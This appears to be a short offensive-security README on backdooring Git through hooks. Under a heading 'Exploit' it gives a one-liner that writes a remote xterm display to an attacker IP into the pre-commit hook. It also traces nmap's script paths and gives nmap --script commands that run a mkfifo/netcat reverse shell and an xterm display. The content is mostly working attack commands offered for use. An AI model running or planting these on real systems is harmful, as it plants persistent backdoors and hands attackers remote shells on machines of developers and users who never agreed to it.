Git hooks "backdoor"
======================

"*...Like many other Version Control Systems, Git has a way to fire off custom scripts when certain important actions occur. There are two groups of these hooks: client-side and server-side. Client-side hooks are triggered by operations such as committing and merging, while server-side hooks run on network operations such as receiving pushed commits. You can use these hooks for all sorts of reasons...*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=rCVmWUf8x1E" target="_blank"><img src="http://img.youtube.com/vi/rCVmWUf8x1E/0.jpg" alt="Profit with Git hooks!" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit

```

You can use whatever payload you want to exploit, using lame xterm to visually show off payload execution to get a reverse shell to attacker.


$ strace nmap -A 127.0.0.1 -p80 2>&1 | egrep -o '".*\.nse"' | rev | cut -f2- -d\/ | rev | sort -u
"/home/ucastro/.nmap/scripts
"/home/ucastro/.nmap/updates/6.00/scripts
"./scripts
"/usr/local/bin/scripts
"/usr/local/bin/../share/nmap/scripts
"/usr/local/bin/../share/nmap/updates/6.00/scripts
"/usr/local/bin/updates/6.00/scripts
"/usr/local/share/nmap/updates/6.00/scripts


nmap cmd line execution:
nmap --script <(echo "os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 127.0.0.1 8080 >/tmp/f')")
nmap --script <(echo "os.execute('xterm -display 127.0.0.1:1')")



